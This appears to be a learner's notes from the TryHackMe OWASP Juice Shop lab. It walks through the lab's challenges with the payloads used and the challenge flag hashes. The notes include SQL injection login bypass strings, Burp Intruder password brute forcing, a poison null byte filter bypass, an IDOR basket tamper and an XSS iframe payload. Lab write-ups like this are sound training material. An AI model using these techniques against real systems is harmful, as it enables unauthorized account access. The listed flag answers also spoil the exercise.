
#FreeRoom  #OWASP 

https://tryhackme.com/r/room/owaspjuiceshop

```
admin@juice-sh.op

http://10.10.251.68/#/search?q=test

star trek
replicator

```

## inject the juice

![[Screen Shot 2025-01-18 at 11.35.52 AM.png]]

```
http://10.10.251.68/#/login

BurpSuite - Intercept On
foxyproxy - On

email: a   password: a
send to repeater > change   email: "' or 1=1" > send

169940f83378cc420ae4fdeb9c1f73631a2baee6 == not valid

admin@juice-sh.op

select * from users where user='admin@juice-sh.op' and pass='' or 1=1--'

32a5e0f21372bcc1000a6088b93b458e41f0e02a = valid

bender@juice-sh.op'--  : a

fb364762a3c102b2db932069c0e6b78e738d4066 = valid

```

## who broke my lock 

weak passwords, weak authentication

brute forcing admin account password
```
burp suite: intruder tab

{"email":"admin@juice-sh.op","password":"§§"}

payload:  /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt

Load payload
Intruder - Off
start attack

successful request 200
admin123

c2110d06dc6f81c67cd8099ff0ba601241f1ac0e = valid

```

reset Jim's password

```
jim star trek
L george kirk, winona kirk, george samuel kirk, tiberius kirk, james

login > forgot password

jim@juice-sh.op 
security question: Samuel
new password: starfleet

094fbc9b48e525150ba97d05b942bbf114987257 = valid

```

## dont look

about us page

```
http://10.10.251.68/ftp/legal.md

http://10.10.251.68//ftp/

    quarantine
    acquisitions.md
    announcement_encrypted.md
    coupons_2013.md.bak
    eastere.gg
    encrypt.pyc
    incident-support.kdbx
    legal.md
    package.json.bak
    suspicious_errors.yml

wget the acquisitions.md
go to homepage

edf9281222395a1c5fee9b89e32175f1ccf50c5b = valid

```

## safe search account

https://www.youtube.com/watch?v=v59CX2DiX0Y

```
password Mr.Noodles     

mc.safesearch@juice-sh.op : Mr.N00dles

mc.safesearch@juice-sh.op

66bdcffad9e698fd534003fbb3cc7e2b7b55d7f0 = valid
```

```
/ftp/
download package.json.bak
	403 Error: Only .md and .odf files allowed 

Poison Null Byte 
http://10.10.251.68/ftp/package.json.bak%2500.md    

back to homepage

bfc1e6b4a16579e85e06fee4c36ff8c02fb13795 = valid
```

## admin 

```
http://10.10.56.163/main-es2015.js

search for admin

/#/administration

946a799363226a24822008503f5d1324536629a0 = valid

as admin > check basket > capture request

GET /rest/basket/1 HTTP/1.1

change to /basket/2

41b997a36cc33fbe4f0ba018474e19ae5ce52121 = valid

/#/asministration
delete all 5 star reviews

50c97bcce0b895e446d61c83a21df371ac2266ef = valid

```

## xss

```
search box
<iframe src="javascript:alert(`xss`)">

http://10.10.56.163/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E

9aaf4bbea5c30d00a1f5bbcfce4db6d4b0efe0bf = valid

admin > privacy & security > last login ip
ip address 0.0.0.0
intercept ON
logout

----- needed walkthrough
https://ex0a.medium.com/tryhackme-owasp-juice-shop-53e87fb1af36

 149aa8ce13d7a4a8a931472308e269c94dc5f156
```

